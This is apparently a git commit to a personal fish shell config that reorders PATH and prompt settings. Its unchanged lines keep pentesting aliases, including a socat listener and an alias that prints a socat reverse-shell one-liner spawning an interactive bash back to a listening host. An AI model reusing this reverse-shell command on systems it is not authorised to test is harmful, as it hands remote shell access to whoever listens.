8e752fe6171809582ff87b4d7fd1ab141d5b3ac9
cinerieus <cinereus@protonmail.com>
2023-04-13 12:32:58 +0100

    Update config.fish

--- config.fish
+++ config.fish
@@ -1,3 +1,13 @@
+if status is-login
+    contains ~/.local/bin $PATH
+    or set PATH ~/.local/bin $PATH
+end
+
+if status is-interactive
+    set theme_complete_path yes
+    set fish_prompt_pwd_dir_length 0
+end
+
 alias px='proxychains -q'
 alias ls='ls --color=auto'
 alias ll='ls --color=auto -lah'
@@ -5,14 +15,6 @@ alias copy='rsync -ah --info=progress2'
 alias solisten='socat file:`tty`,raw,echo=0 tcp-listen:$LPORT'
 alias soconn='echo "socat exec:\"bash -li\",pty,stderr,setsid,sigint,sane tcp:[(hostname -i)]:$LPORT"'
 
-fish_add_path ~/.local/bin
-
-#set PATH ~/.local/bin $PATH
 #set -x CC /usr/bin/musl-gcc
 
 umask 002
-
-if status is-interactive
-    set theme_complete_path yes
-    set fish_prompt_pwd_dir_length 0
-end
